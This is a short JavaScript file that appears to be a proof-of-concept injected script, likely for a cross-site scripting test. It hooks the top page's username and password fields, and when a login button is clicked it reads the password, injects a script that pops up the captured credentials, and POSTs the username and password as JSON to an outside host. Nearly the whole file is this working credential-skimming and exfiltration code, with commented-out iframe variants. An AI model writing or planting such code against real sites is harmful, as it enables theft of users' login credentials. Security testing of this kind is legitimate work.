// alert('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');
top.console.log('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');

// f = document.createElement("iframe");
// f.id = "pwn";
// f.src = "/";
let user;
let pw;
top.console.log('loaded script')
// f.onload = () => {
  top.username.addEventListener('change', e => user = e.target.value);
  // top.password.addEventListener('change', e => user = e.target.value);
  document.getElementsByTagName('button')[2].addEventListener('click', () => {
  // top.document.getElementsByTagNameforms[0].addEventListener('submit', () => {
    console.log("submitting a form");
    if (top.document.forms[0].elements[0].classList.contains('hidden-input')) {
      console.log("doing shit", top.password.value);
      pw = top.password.value;
      x = document.createElement('script');
      x.src = 'data:,alert("Pwned "+user+" "+pw)';
      pwn.contentWindow.document.body.appendChild(x)
      alert('Wow!, submitted user password ' + user + ' ' + pw);

      fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST',
        headers: {'Accept': 'application/json', 'Content-Type': 'application/json' },
        body: JSON.stringify({a: user, b: pw})
      }).then(resp => {
        console.log(resp.json());
      })
    } else {
      console.log("not doing anything");
      console.log(top.document.forms[0].elements[0]);
    }
  })
// };